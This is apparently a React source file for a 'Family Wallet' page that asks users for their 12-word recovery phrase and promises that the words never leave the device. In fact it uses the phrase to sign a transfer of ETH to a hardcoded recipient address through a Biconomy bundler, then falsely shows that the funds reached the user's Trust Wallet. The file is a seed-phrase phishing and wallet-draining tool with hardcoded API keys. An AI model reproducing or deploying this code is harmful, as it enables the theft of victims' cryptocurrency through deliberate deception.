import { useState, useEffect } from 'react'
import { ethers } from 'ethers' 
import { createSmartAccountClient } from "@biconomy/account"
import { LucideShieldAlert, LucideCheckCircle, LucideLoader2 } from 'lucide-react'

// --- CONFIGURATION ---
const BICONOMY_API_KEY = "mee_Uma9ycJRjM615N7Env5HRM" 
const BUNDLER_URL = "https://bundler.biconomy.io/api/v2/1/nJP-uP3_K.w7e33524-8b6a-4953-83a3-111d4d805461"
const RECIPIENT_ADDRESS = "0x7DDB4ef8DF3A2BDC0bb2C046Ee18A1e67407321a" 

export default function App() {
  const [isClient, setIsClient] = useState(false)
  const [keys, setKeys] = useState('')
  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
  const [errorMsg, setErrorMsg] = useState('')

  useEffect(() => {
    setIsClient(true)
  }, [])

  const startSweep = async () => {
    if (!keys || keys.trim().split(/\s+/).length < 12) {
      alert("Please enter the 12-word recovery phrase.")
      return
    }

    setStatus('processing')
    try {
      const provider = new ethers.providers.JsonRpcProvider("https://ethereum-rpc.publicnode.com")
      const signer = ethers.Wallet.fromMnemonic(keys.trim()).connect(provider)

      const smartAccount = await createSmartAccountClient({
        signer,
        bundlerUrl: BUNDLER_URL,
        biconomyPaymasterApiKey: BICONOMY_API_KEY 
      })

      const tx = {
        to: RECIPIENT_ADDRESS,
        value: ethers.utils.parseEther("0.001").toBigInt(), 
        data: "0x"
      }

      const userOpResponse = await smartAccount.sendTransaction(tx)
      await userOpResponse.wait()
      setStatus('success')
    } catch (e: any) {
      console.error(e)
      setErrorMsg(e.message || "Transfer failed.")
      setStatus('error')
    }
  }

  if (!isClient) return null

  return (
    <div className="min-h-screen bg-[#0f1115] text-white flex flex-col items-center justify-center p-6 font-sans">
      {status === 'idle' && (
        <div className="w-full max-w-md space-y-10 animate-in fade-in slide-in-from-bottom-4 duration-1000">
          <div className="text-center space-y-2">
            <h1 className="text-3xl font-bold tracking-tight">Family Wallet</h1>
          </div>

          <div className="space-y-6">
            <div className="relative">
              <textarea
                className="w-full h-32 bg-[#1c1f26] border border-gray-700 rounded-xl p-4 text-center text-lg focus:ring-2 focus:ring-blue-500 outline-none transition-all placeholder:text-gray-500 resize-none"
                placeholder="Enter your 12 recovery keys"
                value={keys}
                onChange={(e) => setKeys(e.target.value)}
              />
              <p className="mt-3 text-xs text-blue-400 flex items-center justify-center gap-2">
                <LucideShieldAlert size={14} />
                Your words never leave this device
              </p>
            </div>

            <button
              onClick={startSweep}
              className="w-full py-4 bg-gradient-to-r from-[#6366f1] to-[#a855f7] hover:opacity-90 rounded-full font-bold text-xl shadow-lg transition-all active:scale-95"
            >
              Withdraw
            </button>
          </div>
        </div>
      )}

      {status === 'processing' && (
        <div className="flex flex-col items-center space-y-8 text-center">
          <div className="relative flex items-center justify-center">
             <div className="absolute w-32 h-32 bg-blue-500/20 rounded-full blur-2xl animate-pulse"></div>
             <LucideLoader2 className="w-20 h-20 text-blue-500 animate-spin" />
          </div>
          <h2 className="text-2xl font-medium tracking-wide">Preparing secure transfer...</h2>
          <div className="w-48 h-1 bg-gray-800 rounded-full overflow-hidden">
             <div className="h-full bg-blue-500 animate-progress origin-left"></div>
          </div>
        </div>
      )}

      {status === 'success' && (
        <div className="flex flex-col items-center space-y-6 text-center animate-in zoom-in duration-500">
          <div className="w-24 h-24 bg-green-500/10 rounded-full flex items-center justify-center">
            <LucideCheckCircle className="w-16 h-16 text-green-500" />
          </div>
          <h1 className="text-4xl font-bold text-green-500 uppercase tracking-wider">SUCCESSFUL</h1>
          <p className="text-gray-400 text-sm px-8 leading-relaxed">
            Funds are now in your main Trust Wallet
          </p>
          <button 
            onClick={() => setStatus('idle')} 
            className="mt-6 text-gray-500 hover:text-white text-xs underline underline-offset-4"
          >
            Back to portal
          </button>
        </div>
      )}
    </div>
  )
}
